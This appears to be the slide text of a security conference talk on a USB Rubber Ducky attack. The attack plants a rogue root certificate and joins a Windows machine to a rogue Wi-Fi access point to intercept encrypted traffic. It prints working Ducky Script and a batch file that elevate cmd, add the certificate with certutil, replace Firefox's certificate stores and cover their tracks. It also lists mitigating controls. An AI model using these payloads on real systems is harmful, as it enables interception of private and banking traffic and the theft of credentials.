USB Attack to Decrypt Wi-Fi 
Communications
Presented by: Jeremy Dorrough
Disclaimer
Opinions expressed in this presentation are
my own. I am speaking for myself, not
Genworth, nor anyone else.
Image Source: iwishisaidthat.com
About Me
• 10+ years in IT Security 
industry
• Worked in defense, 
utility & financial 
sectors
• Currently a Network 
Security Engineer at 
Genworth 
• I crash cars for fun
Presentation Outline
 USB Rubber Ducky
 How the Attack Works
 Keyboard Payload
 Mass Storage/Keyboard Payload
 Demo
 Questions
USB Rubber Ducky
Image Source: http://hakshop.myshopify.com/
Firmware Options
• Duck
– Keyboard Input
• FAT Duck
– Mass Storage Device
• Detour Duck
– Multiple Payloads
• Twin Duck
– Both Keyboard and Mass Storage Device
Teensy
https://github.com/adamcaudill/Psychson
How The Attack Works
How The Attack Works
How The Attack Works
Social Engineer???
DHS Study Performed by idappcom:
• 60% Plugged in dropped USB device
• 90% Plugged in USB device if case had an official logo
http://www.bloomberg.com/news/articles/2011-06-27/human-errors-fuel-hacking-as-test-shows-nothing-prevents-idiocy
Image Source: www.qualitylogoproducts.com
The Cat and Mouse Game
• Anti-Virus
• Web filters/Proxy 
• FTP whitelist 
• HTTP Strict Transport Security (HSTS)
Setup Rogue AP
• Hostapd 
• dnsmasq 
• Iptables 
• Alternatively use mana-toolkit
Setup MITM Listener 
• Configure a proxy of your choice
• Burpsuite, Squid, SSLStrip, Mallory, etc. 
• Export the certificate
• Convert the certificate to base64 encoding
-----BEGIN CERTIFICATE-----
MIICxDCCAi2gAwIBAgIEVOdW+zANBgkqhkiG9w0BAQUFADCBijEUMBIGA1UEBhML
UG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0
U3dpZ2dlcjEUMBIGA1( )gQWBBTSJrL4vz7JJPJ67CNmrwAnfuTs0zANBgkqhkiG9w0B
AQUFAAOBgQCBMulw4WP++I76bfvXQ4RAgNo0DYiasfw4SniawhnfpDE4spV1vjzf
IbQQVcetDdnCvSB6YVE0Rv3HQbTZE5r170dOvl4o6Yr3wgFF9sUUqQq+M/Z4wRgg
8OJPgC8PXCmkelAO166m4w7h3DlnQj1cGNdQr5AmMksvEmDvioTz0A==
-----END CERTIFICATE-----
Burpsuite Proxy Settings
Payload Summary
1. Bypass UAC and open CMD.exe
2. Create a new .cer file from keyboard input
3. Add cert.cer to trusted root using certutil
4. Create a wireless profile
5. Connect to wireless profile
6. Clean up
Ducky Script API
• DELAY [time in milliseconds ]
• STRING [standard keyboard entry]
• ENTER [Enter key]
• GUI [Windows key]
• REM [will not be processed]
github.com/hak5darren/USB-Rubber-
Ducky/wiki/Duckyscript
Bypass UAC cmd.exe
DELAY 10000
GUI r
DELAY 200
STRING powershell Start-Process cmd -Verb runAs
Code Used from Darren Kitchen’s UAC bypass
Image Source: technet.microsoft.com
Create Base64 Certificate
STRING copy con cert.cer
ENTER
STRING -----BEGIN CERTIFICATE-----
ENTER
STRING MIICxDCCAi2gAwIBAgIEVOdW+zANBgkUMBIGA1UEBhML
ENTER
STRING UG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2EwtQb3J0
(…)
You Trust Me….Right?
STRING certutil -addstore -f -enterprise -user root cert.cer
Image Source: diariodigitalcolombiano.com
…Now Tell Me Your Secrets
• Echo xml network profile to a file
• Using xml file, create and connect to new 
Wireless profile
Cover your tracks
• Delete xml file 
• Delete rouge certificate
All Your Bank Are Belong To Us
Internet Explorer
Internet Explorer
Chrome
Chrome
Firefox
Firefox
Twin Duck Firmware
• Mounts both mass storage and HID 
keyboard
• Must reflash the USB Rubber Ducky
• Only use if target allows mass storage 
devices
• Micro SD card not ideal for fast I/O
Create New Firefox Truststore
Create New Firefox Truststore
• Add Trusted CA to fresh build of Firefox 
• %APPDATA%\Mozilla\Firefox\Profiles\*.default
• Keystore, key3.db
• Truststore, cert8.db
Twin Duck Attack Summary
1. Bypass UAC and open CMD.exe
2. Create script to identify storage mount
3. Create vbs script to run batch file invisibly
4. Run batch file
– Adds cert to Windows Trusted Root
– Overwrites Firefox cert8.db and key3.db files
– Creates wireless profile
– Connects to wireless profile
Trusted-cert.bat
taskkill /IM Firefox.exe /F
copy /Y %DUCKYdrive%\cert.cer %USERPROFILE%\cert.cer
certutil -addstore -f -enterprise -user root cert.cer
del cert.cer
cd %APPDATA%\Mozilla\Firefox\Profiles\*.default
copy /Y cert8.db cert8.db.original
copy /Y %DUCKYdrive%\cert8.db cert8.db
copy /Y key3.db key3.db.original
copy /Y %DUCKYdrive%\key3.db key3.db
E:\DUCKY
Internet Explorer
Internet Explorer
Chrome
Chrome
Firefox
Firefox
Mitigating Controls
• Wireless Intrusion Prevention System (WIPS)
• Disable mass storage devices
• Disable USB ports
• User training to encourage responsible USB 
usage
• Multifactor Authentication
• Cloud Proxy Agent
Demonstration
Things to Consider
• Use proxy settings pointed to cloud 
listener
• Increasing the authenticity
• Syntax changes for different OS
• New payloads are frequently released on 
HAK5 forums
Questions
Email: PI:EMAIL